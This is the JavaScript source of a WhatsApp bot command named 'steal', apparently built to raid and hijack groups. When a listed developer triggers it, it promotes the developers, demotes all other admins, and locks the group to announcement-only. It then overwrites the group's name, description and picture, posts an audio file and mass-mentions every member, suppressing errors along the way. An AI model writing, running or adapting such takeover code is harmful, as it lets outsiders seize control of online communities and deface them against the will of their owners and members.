const fs = require("fs");
const path = require("path");
const { DEVELOPERS } = require("../config");

module.exports = {
  name: "سرق",
  description: "تطبيق إعدادات الزرف كاملة (مطور فقط)",

  run: async (sock, m) => {
    const from = m.key.remoteJid;
    const sender = m.key.participant || m.key.remoteJid;

    if (!DEVELOPERS.includes(sender)) {
      return sock.sendMessage(from, { text: "🚫 الأمر للمطور فقط." }, { quoted: m });
    }

    if (!from.endsWith("@g.us")) {
      return sock.sendMessage(from, { text: "❌ يعمل في المجموعات فقط." }, { quoted: m });
    }

    const zarfPath = path.join(__dirname, "../data/zarf.json");
    if (!fs.existsSync(zarfPath)) {
      return sock.sendMessage(from, { text: "❌ zarf.json غير موجود." }, { quoted: m });
    }

    const zarf = JSON.parse(fs.readFileSync(zarfPath, "utf8"));

    // 🔥 رياكت
    if (zarf.react) {
      try {
        await sock.sendMessage(from, {
          react: { text: zarf.react, key: m.key }
        });
      } catch {}
    }

    let metadata;
    try {
      metadata = await sock.groupMetadata(from);
    } catch {
      metadata = null;
    }

    const participants = metadata?.participants || [];
    const allMembers = participants.map(p => p.id);

    /* ───── 0️⃣ ترقية المطورين أولًا ───── */
    for (const dev of DEVELOPERS) {
      try {
        const member = participants.find(p => p.id === dev);
        if (member && !member.admin) {
          await sock.groupParticipantsUpdate(from, [dev], "promote");
        }
      } catch {}
    }

    /* ───── 1️⃣ سحب الإشراف من غير المطورين ───── */
    if (metadata) {
      const admins = participants.filter(
        p => p.admin === "admin" || p.admin === "superadmin"
      );

      for (const admin of admins) {
        try {
          if (DEVELOPERS.includes(admin.id)) continue;
          if (admin.id === sock.user.id) continue;
          await sock.groupParticipantsUpdate(from, [admin.id], "demote");
        } catch {}
      }
    }

    /* ───── 2️⃣ قفل المجموعة ───── */
    try {
      await sock.groupSettingUpdate(from, "announcement");
    } catch {}

    /* ───── 3️⃣ الاسم ───── */
    if (zarf.name) {
      try {
        await sock.groupUpdateSubject(from, zarf.name);
      } catch {}
    }

    /* ───── 4️⃣ الوصف ───── */
    if (zarf.description) {
      try {
        await sock.groupUpdateDescription(from, zarf.description);
        await sock.sendMessage(from, { text: `📌 ${zarf.description}` });
      } catch {}
    }

    /* ───── 5️⃣ الصورة ───── */
    if (zarf.image && fs.existsSync(zarf.image)) {
      try {
        const img = fs.readFileSync(zarf.image);
        await sock.updateProfilePicture(from, img);
      } catch {}
    }

    /* ───── 6️⃣ الصوت (بدون تحويل) ───── */
    if (zarf.voice && fs.existsSync(zarf.voice)) {
      try {
        const audio = fs.readFileSync(zarf.voice);
        await sock.sendMessage(from, {
          audio,
          mimetype: "audio/mpeg",
          ptt: false
        });
      } catch {}
    }

    /* ───── 7️⃣ المنشن ───── */
    if (zarf.mention && allMembers.length) {
      try {
        await sock.sendMessage(from, {
          text: zarf.mention,
          mentions: allMembers
        });
      } catch {}
    }
  }
};